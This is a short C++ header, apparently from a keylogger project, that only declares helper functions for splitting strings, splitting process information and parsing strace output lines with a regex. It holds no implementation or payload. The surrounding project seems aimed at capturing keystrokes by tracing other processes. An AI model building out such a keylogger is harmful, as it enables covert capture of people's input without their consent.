#ifndef KEYLOGGER_PARSING_HPP
#define KEYLOGGER_PARSING_HPP

#include <string>
#include <iostream>
#include <boost/filesystem/path.hpp>
#include <cstring>
#include <thread>
#include <algorithm>
#include <fcntl.h>
#include <boost/regex.hpp>
#include <boost/program_options.hpp>


void DEBUG_STDOUT(const std::string& msg);
void DEBUG_STDERR(const std::string& msg);

namespace parsing_utils {
    std::vector<std::string> split_string(const std::string &s, char delim);

    std::tuple<std::string, uint16_t, std::string, std::string> split_proc_info(const std::string& proc_info);

    std::string parse_strace_line(const std::string &output, boost::regex &xRegEx);
}

#endif //KEYLOGGER_PARSING_HPP
